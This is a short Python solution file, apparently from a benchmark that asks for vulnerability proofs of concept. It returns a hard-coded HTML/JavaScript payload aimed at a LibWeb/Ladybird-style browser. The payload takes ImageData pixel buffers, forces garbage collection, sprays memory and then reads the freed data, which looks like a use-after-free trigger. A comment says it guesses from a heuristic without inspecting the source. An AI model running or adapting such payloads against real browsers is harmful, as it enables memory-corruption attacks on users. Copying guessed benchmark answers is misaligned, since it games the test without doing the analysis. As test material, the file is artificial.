import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic: most likely a LibWeb/Ladybird-style HTML harness; return HTML PoC.
        # (We avoid heavy source inspection to keep runtime low and robust.)
        poc = (
            "<!doctype html><meta charset=utf-8><body><script>(function(){"
            "function force_gc(){"
            "var f=globalThis.gc||globalThis.collectGarbage||globalThis.__gc;"
            "if(f){for(var i=0;i<10;i++)try{f();}catch(e){};return;}"
            "var a=[];"
            "for(var i=0;i<80000;i++)a.push({i:i,s:'s'+i});"
            "if(typeof ArrayBuffer==='function')for(var j=0;j<64;j++)a.push(new ArrayBuffer(1024*1024));"
            "a=null;"
            "}"
            "function get_data(W,H){"
            "try{if(typeof ImageData==='function')return (new ImageData(W,H)).data;}catch(e){}"
            "var c=document.createElement('canvas');c.width=W;c.height=H;"
            "var x=c.getContext('2d');return x.createImageData(W,H).data;"
            "}"
            "function run(){"
            "var W=512,H=512,N=W*H*4;"
            "var d=get_data(W,H);"
            "d[0]=7;d[1]=3;d[2]=1;d[3]=9;"
            "force_gc();force_gc();"
            "var junk=[];"
            "if(typeof ArrayBuffer==='function')for(var i=0;i<32;i++)junk.push(new ArrayBuffer(1024*1024));"
            "junk=null;"
            "var t=0;"
            "for(var k=0;k<8192;k++)t=(t+((d[(k*997)&(N-1)]|0)+k))|0;"
            "document.body.textContent=''+t;"
            "}"
            "if(document.readyState==='loading')addEventListener('DOMContentLoaded',run);else run();"
            "})();</script>"
        )
        return poc.encode("utf-8")